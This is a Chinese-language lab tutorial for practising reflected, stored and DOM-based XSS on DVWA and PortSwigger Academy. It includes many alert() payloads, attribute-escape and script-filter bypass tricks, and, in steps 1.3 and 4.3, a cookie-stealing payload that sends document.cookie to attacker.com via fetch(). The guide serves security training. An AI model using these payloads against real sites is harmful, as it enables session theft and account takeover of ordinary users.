# XSS攻击实战练习指南

> 本练习基于DVWA，带领你完成反射型、存储型和DOM型XSS的攻击与检测。
> 靶场：DVWA (Low难度) + PortSwigger Academy

---

## 练习1：反射型XSS

### 环境

```
DVWA → XSS (Reflected) → Low难度
```

### 步骤1.1：基础XSS

```
1. 在输入框输入：<script>alert('XSS')</script>
2. 点击Submit

Expected: 弹窗！出现alert对话框
这证明：
  - 输入被直接嵌入到HTML中
  - <script>标签没有被过滤或转义
  - 你成功注入了JavaScript代码

这是最简单也是最明显的XSS。
```

### 步骤1.2：观察HTML上下文

```
1. 右键页面 → 查看页面源代码（Ctrl+U）
2. 找到你的输入出现在哪个位置

Expected: 类似这样的结构：
  <p>你搜索的是：<script>alert('XSS')</script></p>

你的输入被直接放在了<p>标签内部 → HTML标签之间
这就是为什么<script>标签会被浏览器执行。
```

### 步骤1.3：绕过引号

```
1. 输入框输入：<script>alert(document.cookie)</script>
2. Submit

Expected: 弹窗显示当前页面的所有Cookie

如果有Cookie被弹出 → 可以利用这个XSS偷Cookie
（用类似这样的payload：
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">）
```

---

## 练习2：不同标签的XSS

### 步骤2.1：img标签

```
输入：<img src=x onerror=alert('XSS')>

Expected: 图片加载失败，触发onerror，弹窗
```

### 步骤2.2：svg标签

```
输入：<svg onload=alert('XSS')>

Expected: SVG加载时自动触发onload
```

### 步骤2.3：body标签

```
输入：<body onload=alert('XSS')>

Expected: 页面加载时触发
```

### 步骤2.4：input标签

```
输入：<input onfocus=alert('XSS') autofocus>

Expected: 自动聚焦触发弹窗
```

### 步骤2.5：video标签

```
输入：<video src=x onerror=alert('XSS')>

Expected: 视频加载失败，触发onerror
```

---

## 练习3：属性逃逸

### 步骤3.1：逃逸出属性

```
如果你的输入出现在HTML属性中：

<input value="你的输入">

正常输入：test
HTML：<input value="test">

恶意输入：test" onfocus=alert('XSS') autofocus="
HTML：<input value="test" onfocus=alert('XSS') autofocus="">

Expected: 引号被闭合，属性被逃逸，注入onfocus事件
```

### 步骤3.2：在属性值中注入事件

```
输入：x" onmouseover=alert('XSS') x="

Expected: 鼠标移动时触发
```

---

## 练习4：存储型XSS

### 环境

```
DVWA → XSS (Stored) → Low难度
这是留言板功能
```

### 步骤4.1：存储型XSS

```
1. Message输入框：<script>alert('Stored XSS')</script>
2. Name输入框：随便填
3. Submit

Expected: 页面刷新后立即弹窗！

关键区别：
  - 反射型XSS：只在当前请求/响应中执行
  - 存储型XSS：存储到数据库，每个看到这条内容的人都会中招
```

### 步骤4.2：验证持久性

```
1. 重新打开DVWA（或换一个浏览器）
2. 登录同一个账号
3. 找到之前的留言

Expected: 页面加载时就弹窗！

这就是存储型XSS最危险的地方：
  - 攻击者只需要注入一次
  - 所有访问该页面的用户都会被动执行JavaScript
```

### 步骤4.3：更实用的payload

```
1. 在Message中输入：
   <img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

2. 用另一个浏览器访问同一个页面

Expected: 你的"attacker.com"服务器收到了Cookie数据
（模拟环境：在Burp Collaborator中测试）
```

---

## 练习5：DOM型XSS

### 环境

```
DVWA → XSS (DOM) → Low难度

DOM XSS的特殊性：
  - 服务器返回的HTML是干净的
  - 恶意代码完全由前端JavaScript动态生成
```

### 步骤5.1：观察URL参数

```
1. 访问URL：
   http://localhost:8081/vulnerabilities/xss_d/?default=Test

2. 观察页面变化

Expected: URL中的default参数出现在页面上
```

### 步骤5.2：注入XSS

```
1. 修改URL为：
   http://localhost:8081/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>

2. 访问（直接在地址栏输入）

Expected: 弹窗！

注意：这次<script>标签不在服务器返回的HTML源码中
  而是通过JavaScript从URL读取并写入DOM → DOM XSS
```

### 步骤5.3：不用script标签的DOM XSS

```
有些防护只过滤<script>标签。

用其他方式注入：

1. URL：
   ?default=</select><img src=x onerror=alert('DOM XSS')>

2. URL：
   ?default=<svg onload=alert('DOM XSS')>

Expected: 仍然弹窗！绕过了<script>过滤
```

---

## 练习6：Burp Suite + XSS

### 步骤6.1：拦截和重放

```
1. Burp Suite开启代理
2. DVWA XSS (Reflected) 发送请求
3. Proxy → HTTP History找到请求
4. Send to Repeater

在Repeater中修改参数，反复测试不同的XSS payload。
```

### 步骤6.2：自动扫描

```
Burp Suite Professional：
1. Target → Site Map → 右键目标
2. Engagement tools → Active Scan
3. 等待扫描结果

Community版：手动测试更有效。
```

---

## 练习7：XSS过滤绕过（Medium级别）

### 步骤7.1：切换难度

```
DVWA → Security → Medium → Submit
```

### 步骤7.2：观察过滤

```
输入：<script>alert('XSS')</script>

Expected: 不弹窗！输入可能被过滤了。

查看源码（如果有权限）：
  str_replace('<script>', '', $_GET['name'])

结论：只过滤了<script>标签
```

### 步骤7.3：绕过方式

```
方式1：大小写混合
  <ScrIpT>alert('XSS')</sCrIpT>

方式2：嵌套（双重script）
  <scr<script>ipt>alert('XSS')</scr</script>ipt>
  过滤掉中间的<script>后：<script>alert('XSS')</script>

方式3：不用script标签
  <img src=x onerror=alert('XSS')>
  → 完全绕过了script过滤！
```

---

## 练习8：PortSwigger Academy XSS Labs

```
完成DVWA后，去PortSwigger完成以下Lab：

Lab 1: Reflected XSS into HTML context with nothing encoded
  → 最基础的反射型XSS

Lab 2: Stored XSS into HTML context with nothing encoded
  → 存储型XSS基础

Lab 3: DOM XSS in document.write sink using location.search
  → DOM XSS基础

Lab 4: Reflected XSS into attribute with angle brackets HTML-encoded
  → 属性中的XSS

Lab 5: Stored XSS into anchor href attribute with double quotes HTML-encoded
  → href属性中的XSS

Lab 10: Reflected XSS with some SVG markup allowed
  → 过滤绕过的进阶练习

每个Lab都有Hints和Solutions，但建议先自己想30分钟。
```

---

## 完成标志

完成以上练习后，你应该能够：
- [ ] 能在DVWA完成反射型、存储型、DOM型XSS
- [ ] 理解不同XSS类型的区别和利用条件
- [ ] 知道多种XSS payload（script标签、事件处理器、属性逃逸）
- [ ] 理解为什么存储型XSS最危险
- [ ] 能在Medium级别的过滤下找到绕过方法
- [ ] 能在PortSwigger完成至少3个XSS Lab
